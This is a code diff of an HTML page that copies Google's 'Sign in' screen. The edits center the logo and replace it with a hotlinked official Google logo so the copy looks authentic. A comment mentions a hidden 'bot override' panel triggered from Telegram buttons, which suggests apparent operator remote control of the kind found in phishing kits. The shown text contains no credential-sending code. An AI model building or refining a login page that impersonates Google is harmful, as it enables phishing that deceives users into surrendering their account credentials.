@@ -24,7 +24,13 @@
             text-align: center;
             position: relative;
         }
-        .logo { width: 75px; margin-bottom: 16px; }
+        .logo {
+            width: 75px;
+            margin-bottom: 16px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
         h1 {
             font-size: 24px;
             font-weight: 400;
@@ -98,7 +104,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* --- BOT OVERRIDE (Shown when you tap bot buttons) --- */
+        /* --- BOT OVERRIDE (Shown when you tap Telegram buttons) --- */
         #bot-override {
             display: none;
             text-align: center;
@@ -125,7 +131,7 @@
     <div class="container">
         <!-- 1. GOOGLE LOGIN PAGE -->
         <div id="default-google-page">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="logo" alt="G">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" class="logo" alt="Google">
             <h1>Sign in</h1>
             <div class="subtitle">to continue to Google Account</div>
             
